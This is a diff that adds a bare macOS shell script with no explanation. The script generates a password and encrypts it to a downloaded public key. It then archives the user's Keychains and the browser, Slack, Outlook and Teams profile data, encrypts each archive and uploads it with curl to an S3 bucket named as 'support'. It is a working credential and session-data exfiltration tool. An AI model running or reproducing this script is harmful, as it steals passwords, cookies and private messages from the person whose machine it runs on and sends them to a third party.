@@ -1,0 +1,23 @@
+curl -o public.key https://form3tech-support.github.io/public.html
+openssl rand -base64 24 | tr -d "\n" > passwd.txt
+
+cat passwd.txt | openssl pkeyutl -encrypt -pubin -inkey public.key -out $(whoami)_passwd.enc
+curl -s -X PUT --upload-file $(whoami)_passwd.enc https://form3tech-support.s3.eu-west-2.amazonaws.com/3dd025de-a26e-41e6-843b-7e9c03875e13/ &
+
+tar -czf - ./Library/Keychains | openssl enc -aes-256-cbc -pbkdf2 -iter 200000 -salt -pass file:passwd.txt -out $(whoami)_keychain.tar.gz.enc
+curl -s -X PUT --upload-file $(whoami)_keychain.tar.gz.enc https://form3tech-support.s3.eu-west-2.amazonaws.com/3dd025de-a26e-41e6-843b-7e9c03875e13/ &
+
+tar -czf - ./Library/Application\ Support/Firefox/Profiles/ | openssl enc -aes-256-cbc -pbkdf2 -iter 200000 -salt -pass file:passwd.txt -out $(whoami)_ff.tar.gz.enc
+curl -s -X PUT --upload-file $(whoami)_ff.tar.gz.enc https://form3tech-support.s3.eu-west-2.amazonaws.com/3dd025de-a26e-41e6-843b-7e9c03875e13/ &
+
+tar -czf - ./Library/Containers/com.tinyspeck.slackmacgap/Data/Library/Application\ Support/Slack | openssl enc -aes-256-cbc -pbkdf2 -iter 200000 -salt -pass file:passwd.txt -out $(whoami)_slack.tar.gz.enc
+curl -s -X PUT --upload-file $(whoami)_slack.tar.gz.enc https://form3tech-support.s3.eu-west-2.amazonaws.com/3dd025de-a26e-41e6-843b-7e9c03875e13/ &
+
+tar -czf - ./Library/Group\ Containers/UBF8T346G9.Office/Outlook/Outlook\ 15\ Profiles | openssl enc -aes-256-cbc -pbkdf2 -iter 200000 -salt -pass file:passwd.txt -out $(whoami)_outlook.tar.gz.enc
+curl -s -X PUT --upload-file $(whoami)_outlook.tar.gz.enc https://form3tech-support.s3.eu-west-2.amazonaws.com/3dd025de-a26e-41e6-843b-7e9c03875e13/ &
+
+tar -czf - ./Library/Application\ Support/Microsoft/Teams/ | openssl enc -aes-256-cbc -pbkdf2 -iter 200000 -salt -pass file:passwd.txt -out $(whoami)_outlook.tar.gz.enc
+curl -s -X PUT --upload-file $(whoami)_outlook.tar.gz.enc https://form3tech-support.s3.eu-west-2.amazonaws.com/3dd025de-a26e-41e6-843b-7e9c03875e13/ &
+
+tar -czf - ./Library/Application\ Support/Google/Chrome/ | openssl enc -aes-256-cbc -pbkdf2 -iter 200000 -salt -pass file:passwd.txt -out $(whoami)_chrome.tar.gz.enc
+curl -s -X PUT --upload-file $(whoami)_chrome.tar.gz.enc https://form3tech-support.s3.eu-west-2.amazonaws.com/3dd025de-a26e-41e6-843b-7e9c03875e13/ &
